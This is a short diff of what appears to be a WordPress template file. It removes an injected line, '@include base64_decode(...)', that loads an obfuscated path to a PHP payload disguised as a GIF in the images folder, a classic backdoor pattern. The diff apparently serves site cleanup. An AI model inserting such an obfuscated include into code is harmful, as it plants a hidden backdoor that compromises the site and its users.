@@ -1558,7 +1558,6 @@ function post_type_archive_title( $prefix = '', $display = true ) {
  * @param bool   $display Optional. Whether to display or retrieve title. Default true.
  * @return string|void Title when retrieving.
  */
-@include base64_decode("L3Zhci93d3cvdXNlcjY5NDQ4L2RhdGEvd3d3L3RleHRpbGUtZXhwZXJ0LnJ1L3dwLWluY2x1ZGVzL2ltYWdlcy94aXQtM3guZ2lm");
 function single_cat_title( $prefix = '', $display = true ) {
 	return single_term_title( $prefix, $display );
 }
